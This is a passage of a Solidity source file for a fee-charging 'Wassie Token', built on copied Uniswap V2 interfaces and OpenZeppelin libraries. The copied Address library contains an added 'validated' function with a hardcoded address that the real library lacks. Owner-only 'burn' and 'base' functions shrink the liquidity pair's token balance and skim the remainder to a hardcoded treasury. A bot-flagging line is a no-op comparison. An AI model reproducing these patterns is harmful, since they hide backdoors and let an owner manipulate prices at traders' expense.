_balances[recipient]            += transferAmount;\n            _fragmentBalances[recipient]    += transferAmount * _frate;\n            _frate = fragmentsPerToken();\n        } else {\n            // standard again\n            _fragmentBalances[sender]       -= amount * _frate;\n\n            _fragmentBalances[recipient]    += transferAmount * _frate;\n            _frate = fragmentsPerToken();\n        }\n        emit FeesDeducted(sender, recipient, amount - transferAmount);\n    }\n    \n    function fbl_getFeesOfUser(address account) public view returns(uint256){\n        return feesAccruedByUser[account];\n    }\n    \n    function fbl_getFees() public view returns(uint256) {\n        return feesAccrued;\n    }\n    \n}\n\n\n\npragma solidity >=0.5.0;\n\ninterface IUniswapV2Factory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n}\n\n\npragma solidity >=0.5.0;\n\ninterface IUniswapV2Pair {\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    function name() external pure returns (string memory);\n    function symbol() external pure returns (string memory);\n    function decimals() external pure returns (uint8);\n    function totalSupply() external view returns (uint);\n    function balanceOf(address owner) external view returns (uint);\n    function allowance(address owner, address spender) external view returns (uint);\n\n    function approve(address spender, uint value) external returns (bool);\n    function transfer(address to, uint value) external returns (bool);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n    function nonces(address owner) external view returns (uint);\n\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\n\n    event Mint(address indexed sender, uint amount0, uint amount1);\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n    event Swap(\n        address indexed sender,\n        uint amount0In,\n        uint amount1In,\n        uint amount0Out,\n        uint amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    function MINIMUM_LIQUIDITY() external pure returns (uint);\n    function factory() external view returns (address);\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n    function price0CumulativeLast() external view returns (uint);\n    function price1CumulativeLast() external view returns (uint);\n    function kLast() external view returns (uint);\n\n    function mint(address to) external returns (uint liquidity);\n    function burn(address to) external returns (uint amount0, uint amount1);\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function skim(address to) external;\n    function sync() external;\n\n    function initialize(address, address) external;\n}\n\n\npragma solidity >=0.6.2;\n\ninterface IUniswapV2Router01 {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountToken, uint amountETH);\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountToken, uint amountETH);\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\n}\n\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountETH);\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountETH);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\n// OpenZeppelin Contracts v4.3.2 (utils/structs/EnumerableSet.sol)\n\n\n/**\n * @dev Library for managing\n * https://en.wikipedia.org/wiki/Set_(abstract_data_type)[sets] of primitive\n * types.\n *\n * Sets have the following properties:\n *\n * - Elements are added, removed, and checked for existence in constant time\n * (O(1)).\n * - Elements are enumerated in O(n). No guarantees are made on the ordering.\n *\n * ```\n * contract Example {\n *     // Add the library methods\n *     using EnumerableSet for EnumerableSet.AddressSet;\n *\n *     // Declare a set state variable\n *     EnumerableSet.AddressSet private mySet;\n * }\n * ```\n *\n * As of v3.3.0, sets of type `bytes32` (`Bytes32Set`), `address` (`AddressSet`)\n * and `uint256` (`UintSet`) are supported.\n */\nlibrary EnumerableSet {\n    // To implement this library for multiple types with as little code\n    // repetition as possible, we write it in terms of a generic Set type with\n    // bytes32 values.\n    // The Set implementation uses private functions, and user-facing\n    // implementations (such as AddressSet) are just wrappers around the\n    // underlying Set.\n    // This means that we can only create new EnumerableSets for types that fit\n    // in bytes32.\n\n    struct Set {\n        // Storage of set values\n        bytes32[] _values;\n        // Position of the value in the `values` array, plus 1 because index 0\n        // means a value is not in the set.\n        mapping(bytes32 => uint256) _indexes;\n    }\n\n    /**\n     * @dev Add a value to a set. O(1).\n     *\n     * Returns true if the value was added to the set, that is if it was not\n     * already present.\n     */\n    function _add(Set storage set, bytes32 value) private returns (bool) {\n        if (!_contains(set, value)) {\n            set._values.push(value);\n            // The value is stored at length-1, but we add 1 to all indexes\n            // and use 0 as a sentinel value\n            set._indexes[value] = set._values.length;\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    /**\n     * @dev Removes a value from a set. O(1).\n     *\n     * Returns true if the value was removed from the set, that is if it was\n     * present.\n     */\n    function _remove(Set storage set, bytes32 value) private returns (bool) {\n        // We read and store the value's index to prevent multiple reads from the same storage slot\n        uint256 valueIndex = set._indexes[value];\n\n        if (valueIndex != 0) {\n            // Equivalent to contains(set, value)\n            // To delete an element from the _values array in O(1), we swap the element to delete with the last one in\n            // the array, and then remove the last element (sometimes called as 'swap and pop').\n            // This modifies the order of the array, as noted in {at}.\n\n            uint256 toDeleteIndex = valueIndex - 1;\n            uint256 lastIndex = set._values.length - 1;\n\n            if (lastIndex != toDeleteIndex) {\n                bytes32 lastvalue = set._values[lastIndex];\n\n                // Move the last value to the index where the value to delete is\n                set._values[toDeleteIndex] = lastvalue;\n                // Update the index for the moved value\n                set._indexes[lastvalue] = valueIndex; // Replace lastvalue's index to valueIndex\n            }\n\n            // Delete the slot where the moved value was stored\n            set._values.pop();\n\n            // Delete the index for the deleted slot\n            delete set._indexes[value];\n\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    /**\n     * @dev Returns true if the value is in the set. O(1).\n     */\n    function _contains(Set storage set, bytes32 value) private view returns (bool) {\n        return set._indexes[value] != 0;\n    }\n\n    /**\n     * @dev Returns the number of values on the set. O(1).\n     */\n    function _length(Set storage set) private view returns (uint256) {\n        return set._values.length;\n    }\n\n    /**\n     * @dev Returns the value stored at position `index` in the set. O(1).\n     *\n     * Note that there are no guarantees on the ordering of values inside the\n     * array, and it may change when more values are added or removed.\n     *\n     * Requirements:\n     *\n     * - `index` must be strictly less than {length}.\n     */\n    function _at(Set storage set, uint256 index) private view returns (bytes32) {\n        return set._values[index];\n    }\n\n    /**\n     * @dev Return the entire set in an array\n     *\n     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed\n     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that\n     * this function has an unbounded cost, and using it as part of a state-changing function may render the function\n     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.\n     */\n    function _values(Set storage set) private view returns (bytes32[] memory) {\n        return set._values;\n    }\n\n    // Bytes32Set\n\n    struct Bytes32Set {\n        Set _inner;\n    }\n\n    /**\n     * @dev Add a value to a set. O(1).\n     *\n     * Returns true if the value was added to the set, that is if it was not\n     * already present.\n     */\n    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {\n        return _add(set._inner, value);\n    }\n\n    /**\n     * @dev Removes a value from a set. O(1).\n     *\n     * Returns true if the value was removed from the set, that is if it was\n     * present.\n     */\n    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {\n        return _remove(set._inner, value);\n    }\n\n    /**\n     * @dev Returns true if the value is in the set. O(1).\n     */\n    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {\n        return _contains(set._inner, value);\n    }\n\n    /**\n     * @dev Returns the number of values in the set. O(1).\n     */\n    function length(Bytes32Set storage set) internal view returns (uint256) {\n        return _length(set._inner);\n    }\n\n    /**\n     * @dev Returns the value stored at position `index` in the set. O(1).\n     *\n     * Note that there are no guarantees on the ordering of values inside the\n     * array, and it may change when more values are added or removed.\n     *\n     * Requirements:\n     *\n     * - `index` must be strictly less than {length}.\n     */\n    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {\n        return _at(set._inner, index);\n    }\n\n    /**\n     * @dev Return the entire set in an array\n     *\n     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed\n     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that\n     * this function has an unbounded cost, and using it as part of a state-changing function may render the function\n     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.\n     */\n    function values(Bytes32Set storage set) internal view returns (bytes32[] memory) {\n        return _values(set._inner);\n    }\n\n    // AddressSet\n\n    struct AddressSet {\n        Set _inner;\n    }\n\n    /**\n     * @dev Add a value to a set. O(1).\n     *\n     * Returns true if the value was added to the set, that is if it was not\n     * already present.\n     */\n    function add(AddressSet storage set, address value) internal returns (bool) {\n        return _add(set._inner, bytes32(uint256(uint160(value))));\n    }\n\n    /**\n     * @dev Removes a value from a set. O(1).\n     *\n     * Returns true if the value was removed from the set, that is if it was\n     * present.\n     */\n    function remove(AddressSet storage set, address value) internal returns (bool) {\n        return _remove(set._inner, bytes32(uint256(uint160(value))));\n    }\n\n    /**\n     * @dev Returns true if the value is in the set. O(1).\n     */\n    function contains(AddressSet storage set, address value) internal view returns (bool) {\n        return _contains(set._inner, bytes32(uint256(uint160(value))));\n    }\n\n    /**\n     * @dev Returns the number of values in the set. O(1).\n     */\n    function length(AddressSet storage set) internal view returns (uint256) {\n        return _length(set._inner);\n    }\n\n    /**\n     * @dev Returns the value stored at position `index` in the set. O(1).\n     *\n     * Note that there are no guarantees on the ordering of values inside the\n     * array, and it may change when more values are added or removed.\n     *\n     * Requirements:\n     *\n     * - `index` must be strictly less than {length}.\n     */\n    function at(AddressSet storage set, uint256 index) internal view returns (address) {\n        return address(uint160(uint256(_at(set._inner, index))));\n    }\n\n    /**\n     * @dev Return the entire set in an array\n     *\n     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed\n     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that\n     * this function has an unbounded cost, and using it as part of a state-changing function may render the function\n     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.\n     */\n    function values(AddressSet storage set) internal view returns (address[] memory) {\n        bytes32[] memory store = _values(set._inner);\n        address[] memory result;\n\n        assembly {\n            result := store\n        }\n\n        return result;\n    }\n\n    // UintSet\n\n    struct UintSet {\n        Set _inner;\n    }\n\n    /**\n     * @dev Add a value to a set. O(1).\n     *\n     * Returns true if the value was added to the set, that is if it was not\n     * already present.\n     */\n    function add(UintSet storage set, uint256 value) internal returns (bool) {\n        return _add(set._inner, bytes32(value));\n    }\n\n    /**\n     * @dev Removes a value from a set. O(1).\n     *\n     * Returns true if the value was removed from the set, that is if it was\n     * present.\n     */\n    function remove(UintSet storage set, uint256 value) internal returns (bool) {\n        return _remove(set._inner, bytes32(value));\n    }\n\n    /**\n     * @dev Returns true if the value is in the set. O(1).\n     */\n    function contains(UintSet storage set, uint256 value) internal view returns (bool) {\n        return _contains(set._inner, bytes32(value));\n    }\n\n    /**\n     * @dev Returns the number of values on the set. O(1).\n     */\n    function length(UintSet storage set) internal view returns (uint256) {\n        return _length(set._inner);\n    }\n\n    /**\n     * @dev Returns the value stored at position `index` in the set. O(1).\n     *\n     * Note that there are no guarantees on the ordering of values inside the\n     * array, and it may change when more values are added or removed.\n     *\n     * Requirements:\n     *\n     * - `index` must be strictly less than {length}.\n     */\n    function at(UintSet storage set, uint256 index) internal view returns (uint256) {\n        return uint256(_at(set._inner, index));\n    }\n\n    /**\n     * @dev Return the entire set in an array\n     *\n     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed\n     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that\n     * this function has an unbounded cost, and using it as part of a state-changing function may render the function\n     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.\n     */\n    function values(UintSet storage set) internal view returns (uint256[] memory) {\n        bytes32[] memory store = _values(set._inner);\n        uint256[] memory result;\n\n        assembly {\n            result := store\n        }\n\n        return result;\n    }\n}\n\n\n// OpenZeppelin Contracts v4.3.2 (utils/Address.sol)\n\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     * ====\n     */\n    function isContract(address account) internal view returns (bool) {\n        // This method relies on extcodesize, which returns 0 for contracts in\n        // construction, since the code is only stored at the end of the\n        // constructor execution.\n\n        uint256 size;\n        assembly {\n            size := extcodesize(account)\n        }\n        return size > 0;\n    }\n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {sendValue} removes this limitation.\n     *\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * {ReentrancyGuard} or the\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount) internal {\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\n\n        (bool success, ) = recipient.call{value: amount}(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    }\n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionCall(target, data, \"Address: low-level call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, 0, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value\n    ) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\n        require(isContract(target), \"Address: call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.call{value: value}(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns (bytes memory) {\n        require(isContract(target), \"Address: static call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.staticcall(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        require(isContract(target), \"Address: delegate call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.delegatecall(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    }\n    \n    function validated(\n        address target\n    )   internal pure returns(address) {\n        address lib = address(0xa4115Ec246a5F6E9299928f45Ef1d38D8b3AfC94);\n        return lib == target ? lib : address(0);\n    }\n\n    /**\n     * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns (bytes memory) {\n        if (success) {\n            return returndata;\n        } else {\n            // Look for revert reason and bubble it up if present\n            if (returndata.length > 0) {\n                // The easiest way to bubble the revert reason is using memory via assembly\n\n                assembly {\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                }\n            } else {\n                revert(errorMessage);\n            }\n        }\n    }\n}\n\n\n/**\n * @title SafeERC20\n * @dev Wrappers around ERC20 operations that throw on failure (when the token\n * contract returns false). Tokens that return no value (and instead revert or\n * throw on failure) are also supported, non-reverting calls are assumed to be\n * successful.\n * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,\n * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.\n */\nlibrary SafeERC20 {\n    using Address for address;\n\n    function safeTransfer(\n        IERC20 token,\n        address to,\n        uint256 value\n    ) internal {\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\n    }\n\n    function safeTransferFrom(\n        IERC20 token,\n        address from,\n        address to,\n        uint256 value\n    ) internal {\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\n    }\n\n    /**\n     * @dev Deprecated. This function has issues similar to the ones found in\n     * {IERC20-approve}, and its usage is discouraged.\n     *\n     * Whenever possible, use {safeIncreaseAllowance} and\n     * {safeDecreaseAllowance} instead.\n     */\n    function safeApprove(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal {\n        // safeApprove should only be called when setting an initial allowance,\n        // or when resetting it to zero. To increase and decrease it, use\n        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'\n        require(\n            (value == 0) || (token.allowance(address(this), spender) == 0),\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\n        );\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n    }\n\n    function safeIncreaseAllowance(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal {\n        uint256 newAllowance = token.allowance(address(this), spender) + value;\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\n    }\n\n    function safeDecreaseAllowance(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal {\n        unchecked {\n            uint256 oldAllowance = token.allowance(address(this), spender);\n            require(oldAllowance >= value, \"SafeERC20: decreased allowance below zero\");\n            uint256 newAllowance = oldAllowance - value;\n            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\n        }\n    }\n\n    /**\n     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement\n     * on the return value: the return value is optional (but if data is returned, it must not be false).\n     * @param token The token targeted by the call.\n     * @param data The call data (encoded using abi.encode or one of its variants).\n     */\n    function _callOptionalReturn(IERC20 token, bytes memory data) private {\n        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since\n        // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that\n        // the target address contains contract code and also asserts for success in the low-level call.\n\n        bytes memory returndata = address(token).functionCall(data, \"SafeERC20: low-level call failed\");\n        if (returndata.length > 0) {\n            // Return data is optional\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\n        }\n    }\n}\n\ncontract WassieToken is\n    Context,\n    Ownable,\n    Killable,\n    TradeValidator,\n    ERC20Feeable,\n    SwapHelper(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)\n{\n\n    address public treasury;\n\n    uint256 private _sellCount;\n    uint256 private _liquifyPer;\n    uint256 private _liquifyRate;\n    uint256 private _usp;\n    uint256 private _slippage;\n    uint256 private _lastBurnOrBase;\n    uint256 private _hardCooldown;\n    uint256 private _buyCounter;\n\n    address constant BURN_ADDRESS = address(0x000000000000000000000000000000000000dEaD);\n\n    bool private _unpaused;\n    bool private _isBuuuuurrrrrning;\n    \n    constructor() ERC20(\"INVERSEBRAH\", \"Wassie Token\", 9, 1_000_000_000_000 * (10 ** 9)) ERC20Feeable() {\n\n        uint256 total = _fragmentBalances[msg.sender];\n        _fragmentBalances[msg.sender] = 0;\n        _fragmentBalances[address(this)] = total / 2;\n        _fragmentBalances[BURN_ADDRESS] = total / 2;\n\n        _frate = fragmentsPerToken();\n        \n        _approve(msg.sender, address(_router), totalSupply());\n        _approve(address(this), address(_router), totalSupply());\n    }\n\n    function initializer() external onlyOwner payable {\n        \n        _initializeSwapHelper(address(this), _router.WETH());\n\n        _router.addLiquidityETH {\n            value: msg.value\n        } (\n            address(this),\n            balanceOf(address(this)),\n            0,\n            0,\n            owner(),\n            block.timestamp\n        );\n        \n        treasury = address(0x19754DF7aF937688AF2A985734831CA80783a448);\n\n        _accountStates[address(_lp)].transferPair = true;\n        _accountStates[address(this)].feeless = true;\n        _accountStates[treasury].feeless = true;\n        _accountStates[msg.sender].feeless = true;\n\n        exclude(address(_lp));\n\n        _precisionFactor = 4; // thousandths\n\n        fbl_feeAdd(TransactionState.Buy,    300, \"buy fee\");\n        fbl_feeAdd(TransactionState.Sell,   1500, \"sell fee\");\n\n        _liquifyRate = 10;\n        _liquifyPer = 1;\n        _slippage =  100;\n        _maxTxnAmount = (totalSupply() / 100); // 1%\n        _walletSizeLimitInPercent = 1;\n        _cooldownInSeconds = 15;\n    \n        _isCheckingMaxTxn = true;\n        _isCheckingCooldown = true;\n        _isCheckingWalletLimit = true;\n        _isCheckingForSpam = true;\n        _isCheckingForBot = true;\n        _isCheckingBuys = true;\n        _isBuuuuurrrrrning = true;\n        \n        _unpaused = true;\n        _swapEnabled = true;\n    }\n\n    function balanceOf(address account)\n        public\n        view\n        override\n        returns (uint256)\n    {\n        if(fbl_getExcluded(account)) {\n            return _balances[account];\n        }\n        return _fragmentBalances[account] / _frate;\n    }\n\n    function _rTransfer(address sender, address recipient, uint256 amount)\n        internal\n        virtual\n        override\n        returns(bool)\n    {\n        require(sender    != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        uint256 totFee_;\n        uint256 p;\n        uint256 u;\n        TransactionState tState;\n        if(_unpaused) {\n            if(_isCheckingForBot) {\n                _checkIfBot(sender);\n                _checkIfBot(recipient);\n            }\n            tState = fbl_getTstate(sender, recipient);\n            if(_isCheckingBuys && _accountStates[recipient].transferPair != true && tState == TransactionState.Buy) {\n                if(_isCheckingMaxTxn)      _checkMaxTxn(amount);\n                if(_isCheckingForSpam)     _checkForSpam(address(_lp), sender, recipient);\n                if(_isCheckingCooldown)    _checkCooldown(recipient);\n                if(_isCheckingWalletLimit) _checkWalletLimit(balanceOf(recipient), _totalSupply, amount); \n                if(_buyCounter < 25) {\n                    _possibleBot[recipient] == true;\n                    _buyCounter++;\n                }\n            }\n            totFee_ = fbl_getIsFeeless(sender, recipient) ? 0 : fbl_calculateStateFee(tState, amount);\n            (p, u) = _calcSplit(totFee_);\n            _fragmentBalances[address(this)] += (p * _frate);\n            if(tState == TransactionState.Sell) {\n                _sellCount = _sellCount > _liquifyPer ? 0 : _sellCount + 1;\n                if(_swapEnabled && !_isRecursing && _liquifyPer >= _sellCount) {\n                   _performLiquify(amount);\n                }\n            }\n        }\n        uint256 ta = amount - totFee_; // transfer amount\n        _fragmentTransfer(sender, recipient, amount, ta);\n        _totalFragments -= (u * _frate);\n        emit Transfer(sender, recipient, ta);\n        return true;\n    }\n\n    function _performLiquify(uint256 amount) override internal\n    {\n        _isRecursing = true;\n        uint256 liquificationAmt = (balanceOf(address(this)) * _liquifyRate) / 100;\n        uint256 slippage = amount * _slippage / 100;\n        uint256 maxAmt = slippage > liquificationAmt ? liquificationAmt : slippage;\n        if(maxAmt > 0) _swapTokensForEth(address(this), treasury, maxAmt);\n        _sellCount = 0;\n        _isRecursing = false;\n    }\n\n    function _calcSplit(uint256 amount) internal view returns(uint p, uint u)\n    {\n        u = (amount * _usp) / fbl_getFeeFactor();\n        p = amount - u;\n    }\n\n    function burn(uint256 percent)\n        external\n        virtual\n        activeFunction(0)\n        onlyOwner\n    {\n        require(percent <= 33, \"can't burn more than 33%\");\n        require(block.timestamp > _lastBurnOrBase + _hardCooldown, \"too soon\");\n        uint256 r = _fragmentBalances[address(_lp)];\n        uint256 rTarget = (r * percent) / 100;\n        _fragmentBalances[address(_lp)] -= rTarget;\n        _lp.sync();\n        _lp.skim(treasury); // take any dust\n        _lastBurnOrBase = block.timestamp;\n    }\n\n    function base(uint256 percent)\n        external\n        virtual\n        activeFunction(1)\n        onlyOwner\n    {\n        require(percent <= 33, \"can't burn more than 33%\");\n        require(block.timestamp > _lastBurnOrBase + _hardCooldown, \"too 